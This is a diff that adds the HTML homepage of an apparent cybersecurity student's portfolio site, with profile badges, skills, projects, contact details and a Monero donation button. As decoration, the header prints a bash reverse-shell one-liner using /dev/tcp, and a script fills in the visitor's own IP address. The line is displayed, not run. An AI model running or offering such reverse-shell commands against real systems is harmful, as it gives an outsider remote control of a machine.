@@ -1,0 +1,170 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ZarkosCypher Cybersecurity Portfolio</title>
+    <link rel="stylesheet" href="assets/css/styles.css">
+	
+	<nav>
+        <ul>
+			<div class="home">
+				<li><a href="index.html">ZarkosCypher</a></li>
+			</div>
+			<div class="options">
+				<li><a href="#about">Not Done</a></li>
+				<li><a href="WriteUp.html">WriteUp's</a></li>
+				<li><a href="Donate.html">Donate!</a></li>
+			</div>
+		</ul>
+    </nav>
+</head>
+
+
+
+
+
+
+<body>
+    <main>
+		<div class="top-section">
+			<h3>ZarkosCypher</h3>
+			<p> bash -i >& /dev/tcp/<span id="ip-address">Loading...</span>/4444 0>&1 </p>
+			
+		</div>
+		
+		<div class="container">
+		
+			<div class="profile">	
+				<section id="badges">
+					<!iframe src="https://tryhackme.com/api/v2/badges/public-profile?userPublicId=2211668" style='border:none;'><!/iframe>
+					<div class="badge">
+						<a href="https://tryhackme.com/p/ZarkosCypher"><img src="https://tryhackme-badges.s3.amazonaws.com/ZarkosCypher.png" alt="Try Hack Me" width="100%" height="100%"></a>
+						<a href="https://app.hackthebox.com/profile/1622110"><img src="http://www.hackthebox.com/badge/image/1622110" alt="Hack The Box" width="100%" height="100%"></a> 
+						<a href="https://github.com/ZarkosCypher"><img src="assets/img/GitHub-logo.png" alt="GitHub" width="30%" height="30%"></a> 
+						<a href="https://hackerone.com/zarkoscypher "><img src="assets/img/h1-logo.png" alt="HackerOne" width="30%" height="30%"></a> 
+						<a href="https://bugcrowd.com/ZarkosCypher"><img src="assets/img/bugcrowd-logo.png" alt="Bugcrowd" width="30%" height="30%"></a> 
+						<a href="https://x.com/ZarkosCypher"><img src="assets/img/twitter-logo.png" alt="Twitter / X" width="auto" height="70px"></a>
+					</div>
+				</section>
+			</div>
+			
+			<div class="mainpage">
+				<section id="about">
+					<h2>About Me</h2>
+					<p>Hello! I'm ZarkosCypher, a passionate cybersecurity student specializing in penetration testing and ethical hacking. I love solving complex challenges, competing in CTFs, and exploring new tools in the field of cybersecurity.</p>
+				</section>
+
+				<section id="skills">
+					<h2>Skills</h2>
+					<ul>
+						<li>Penetration Testing</li>
+						<li>Vulnerability Assessment</li>
+						<li>Linux and Windows Environments</li>
+						<li>Networking and Protocol Analysis</li>
+					</ul>
+				</section>
+
+				<section id="projects">
+					<h2>Projects</h2>
+					<ul>
+						<li><strong>List Of Write Ups:</strong> <a href = "WriteUp.html"><strong>Write Up's</strong> </a></li>
+						<li><strong>Wi-Fi Security Audit:</strong> Conducted penetration tests on a simulated network using tools like Aircrack-ng.</li>
+						<li><strong>Home Lab:</strong> Built and maintained a virtualized environment to practice penetration testing and incident response.</li>
+					</ul>
+				</section>
+
+				<section id="contact">
+					<h2>Contact</h2>
+					<p>If you'd like to contact me, feel free to reach out!</p>
+					<ul>
+						<li>Email: <a href="mailto:zarkoscypher.marital600@simplelogin.com">zarkoscypher.marital600@simplelogin.com</a></li>
+						<li>GitHub: <a href="https://github.com/zarkoscypher">https://github.com/zarkoscypher</a></li>
+					</ul>
+				</section>
+			</div>
+		</div>
+    </main>
+	
+	
+	
+	
+	<script>
+	//XMR Donate Button
+			// Copy to Clipboard and Show Tooltip
+			document.getElementById('donateXMR-button').addEventListener('click', (event) => {
+			const xmrAddress = "83rBzQSTLDh8Bq248T2EizKfq4TPhqhFeJ96EUUB3uZQ1NUci2mfGhZg7mWdCWLtwoQ5QyUPzzNVV9CWNQrfszvp1TEXi64";
+
+			// Copy the address to clipboard
+			navigator.clipboard.writeText(xmrAddress).then(() => {
+				// Create and show tooltip
+				showTooltip(event, "Copied to clipboard!");
+			}).catch(err => {
+				console.error("Failed to copy address:", err);
+			});
+		});
+
+		function showTooltip(event, message) {
+			// Create the tooltip element
+			const tooltip = document.createElement('div');
+			tooltip.className = 'tooltip';
+			tooltip.textContent = message;
+
+			// Position the tooltip near the mouse click
+			document.body.appendChild(tooltip);
+			const tooltipWidth = 100; // Approximate width of the tooltip
+			tooltip.style.left = `${event.pageX - tooltipWidth / 2}px`; // Center on click
+			tooltip.style.top = `${event.pageY - 30}px`; // Slightly above the cursor
+
+			// Show the tooltip
+			requestAnimationFrame(() => {
+				tooltip.style.opacity = 1;
+			});
+
+			// Remove the tooltip after 2 seconds
+			setTimeout(() => {
+				tooltip.style.opacity = 0;
+				tooltip.addEventListener('transitionend', () => tooltip.remove());
+			}, 2000);
+		}
+	</script>
+	
+	
+	
+	
+	<script>
+	//get ip addres
+		async function fetchIpAddress() {
+			try {
+				const response = await fetch('https://api.ipify.org?format=json');
+				const data = await response.json();
+				document.getElementById('ip-address').textContent = data.ip;
+			} catch (error) {
+				document.getElementById('ip-address').textContent = "Unable to fetch IP.";
+				console.error("Error fetching IP address:", error);
+			}
+		}
+
+		// Fetch the IP address on page load
+		fetchIpAddress();
+	</script>
+	
+</body>
+	
+	
+	
+	
+	
+	
+<footer>
+    <p>&copy; 2024 ZarkosCypher. All rights reserved.</p>
+	<a href="https://tryhackme.com/p/ZarkosCypher"><img src="https://tryhackme-badges.s3.amazonaws.com/ZarkosCypher.png" alt="Try Hack Me" width="auto" height="40px"></a>
+	<a href="https://app.hackthebox.com/profile/1622110"><img src="http://www.hackthebox.com/badge/image/1622110" alt="Hack The Box" width="auto" height="40px"></a> 
+	<a href="https://github.com/ZarkosCypher"><img src="assets/img/GitHub-logo.png" alt="GitHub" width="auto" height="40px"></a> 
+	<a href="https://x.com/ZarkosCypher"><img src="assets/img/twitter-logo.png" alt="Twitter / X" width="auto" height="40px"></a>
+		
+	<p class="crypto-address"><strong>Support Me With XMR! Monero Donation Address:</strong> 83rBzQSTLDh8Bq248T2EizKfq4TPhqhFeJ96EUUB3uZQ1NUci2mfGhZg7mWdCWLtwoQ5QyUPzzNVV9CWNQrfszvp1TEXi64</p>
+	<button id="donateXMR-button" onclick="copyXmrAddress()"><img src="assets/img/XMRdonateAddress.png" alt="XMR QR Code" style="width: 150px; height: 150px;"></button>
+</footer>
+  
+</html>
